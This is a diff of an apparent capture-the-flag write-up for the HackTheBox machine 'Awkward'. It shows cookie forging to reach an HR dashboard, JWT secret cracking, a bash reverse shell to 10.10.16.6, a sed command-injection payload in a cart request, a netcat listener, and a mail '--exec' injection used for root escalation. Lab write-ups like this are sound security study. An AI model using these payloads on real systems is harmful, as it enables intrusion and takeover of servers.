@@ -61,7 +61,7 @@ ________________________________________________
 
 
 
-Upon inspection of app.js I found references to /api and /hr. Trying /hr brought me to a dashboard. Later I learned this had only worked becuase I had set my cookie to token=admin when trying other things.
+Upon inspection of Webpack/src files(In the webpage inspector) I found references to api and hr. Trying /hr brought me to a dashboard. It was also required to change the cookie to admin. I am pretty sure you can change it to anything and it will work.
 
 
 
@@ -156,6 +156,13 @@ Original JWT:
 You can tamper/fuzz the token contents (-T/-I) and sign it using:
 python3 jwt_tool.py [options here] -S hs256 -p "123beany123"
 ```
+
+https://gtfobins.github.io/gtfobins/awk/
+
+
+
+
+
 ```
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
 
@@ -870,6 +877,13 @@ bean@awkward:/tmp$ cat shell.sh
 sh -i >& /dev/tcp/10.10.16.6/1234 0>&1
 ```
 
+```console
+2022/11/01 07:10:01 CMD: UID=0    PID=85429  | /bin/bash /root/scripts/notify.sh 
+2022/11/01 07:10:01 CMD: UID=0    PID=85433  | mail -s Leave Request: bean.hill christine 
+2022/11/01 07:10:01 CMD: UID=0    PID=85436  | /usr/sbin/sendmail -oi -f root@awkward -t 
+2022/11/01 07:10:01 CMD: UID=0    PID=85435  | local -t unix 
+```
+
 ```
 POST /cart_actions.php HTTP/1.1
 Host: store.hat-valley.htb
@@ -888,6 +902,7 @@ Referer: http://store.hat-valley.htb/cart.php
 item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=c007-4b53-30b-e531&action=delete_item
 ```
 
+
 ```console
 └─$ nc -lvnp 1234          
 listening on [any] 1234 ...
@@ -896,6 +911,9 @@ connect to [10.10.16.6] from (UNKNOWN) [10.129.228.81] 58084
 sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+https://gtfobins.github.io/gtfobins/mail/
+
+
 ```
 www-data@awkward:~/private$ echo '" --exec=!/tmp/suid.sh "' > leave_requests.csv
 ```
